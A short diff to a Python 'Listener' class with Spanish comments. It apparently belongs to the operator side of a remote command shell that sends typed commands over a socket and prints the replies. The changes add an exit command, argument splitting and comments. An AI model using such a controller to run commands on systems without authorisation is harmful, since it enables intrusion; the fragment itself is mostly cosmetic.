@@ -24,6 +24,11 @@ class Listener:
     #Decodificación json:
     def reliableRecieve(self):
         jsonData = ''
+        '''
+        Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
+        De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
+        Así aseguramos la integridad de los mismos.
+        '''
         while True:
             try:
                 jsonData = self.connection.recv(4096)                
@@ -33,11 +38,17 @@ class Listener:
 
     def remoteAction(self, command):
         self.reliableSend(command)
+        if command[0] == 'salir' or command[0] == 'Salir':
+            print('Programa finalizado')
+            self.connection.close()
+            exit()
+            
         return self.reliableRecieve()
 
     def run(self):
             while True:
-                command = input('Shell>> ')             
+                command = input('>> ')
+                command = command.split(' ')
                 result = self.remoteAction(command)
                 print(result)
 
@@ -46,4 +57,4 @@ try:
     listener.run()
 
 except KeyboardInterrupt:
-    print('\nPrograma Finalizado')
+    print('\nPrograma interrumpido')
